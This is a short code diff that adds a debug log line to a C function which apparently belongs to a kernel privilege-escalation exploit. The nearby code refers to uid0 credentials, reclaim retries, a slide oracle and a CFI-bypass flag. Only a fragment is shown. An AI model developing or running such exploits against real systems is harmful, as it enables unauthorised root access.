@@ -1848,6 +1848,11 @@ void do_pselect_fake_lock_route(void) {
   const int VS_MAX_RECLAIM_RETRIES = 4;
   int cred_mode = env_flag("MODE4_SLIDE_CRED", 0) &&
                   (g_uid0_child_pid > 0 || g_uid0_check_self);
+  pr_info("ROUTE-DEBUG cred_mode=%d slide_cred_env=%d child_pid=%ld "
+          "check_self=%d nocfi=%d\n",
+          cred_mode, env_flag("MODE4_SLIDE_CRED", 0),
+          (long)g_uid0_child_pid, g_uid0_check_self,
+          env_flag("MODE4_SWAP_NOCFI", 0));
   int oracle_mode = env_flag("MODE4_SLIDE", 0) &&
                     !env_flag("MODE4_SLIDE_SWAP", 0) && g_bootid_before[0];
   /* Child cred retries after a living park KP the boot (3d625fc0 / 3fb81b07).
